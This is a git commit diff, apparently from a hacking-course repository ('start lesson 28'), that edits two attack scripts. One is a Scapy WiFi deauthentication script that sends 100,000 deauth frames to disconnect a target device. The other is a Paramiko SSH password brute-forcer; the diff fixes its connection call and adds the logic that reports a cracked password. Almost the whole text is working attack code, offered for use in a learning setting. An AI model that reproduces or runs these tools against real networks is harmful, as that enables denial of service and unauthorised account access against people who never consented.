fa6e33f9ad7cb9d7c6a6514a8d1080ac76609198
Chris <stofferdyr@gmail.com>
2022-02-10 13:17:16 -0500

    start lesson 28

--- WiFi_Hacks/kick_from_wifi.py
+++ WiFi_Hacks/kick_from_wifi.py
@@ -5,11 +5,11 @@ from scapy.all import (
   sendp        # for sending packets
 )
 
-target_mac = "A2:9A:4A:46:01:9F"
+target_mac = "90:9A:4A:46:01:9F"
 gateway_mac = "90:9A:4A:46:01:9F"
 
-dot11 = Dot11(type=8, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
 
-frame = RadioTap()/dot11/Dot11Deauth()
+frame = RadioTap()/dot11/Dot11Deauth(reason=7)
 
 sendp(frame, iface="wlan0mon", count=100000, inter=0.1)
--- sshbruteforce/sshbrute.py
+++ sshbruteforce/sshbrute.py
@@ -1,11 +1,12 @@
 import paramiko, sys, os, socket, termcolor
 
+
 def ssh_connect(password, code=0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
-        ssh_connect(host, port=22, username=username, password=password)
+        ssh.connect(host, port=22, username=username, password=password)
     except paramiko.AuthenticationException:
         code = 1
     except socket.error as e:
@@ -15,11 +16,10 @@ def ssh_connect(password, code=0):
     return code
 
 
-
 host = input('[+] Target address: ')
 username = input('[+] SSH username: ')
 input_file = input('[+] Password file: ')
-
+print('\n')
 if not os.path.exists(input_file):
     print('[!!] That file/path doesnt exist')
     sys.exit(1)
@@ -28,5 +28,15 @@ with open(input_file, 'r') as file:
     for line in file.readlines():
         password = line.strip()
         try:
-           response = ssh_connect(password)
-           
+            response = ssh_connect(password)
+            if response == 0:
+                print(termcolor.colored(('[+] Found password: ' + password + ', for Account: ' + username), 'green'))
+                break
+            elif response == 1:
+                print('[+] Incorrect login: ' + password)
+            elif response == 2:
+                print('[!!] Cannot connect')
+                sys.exit(1)
+        except Exception as e:
+            print(e)
+            pass
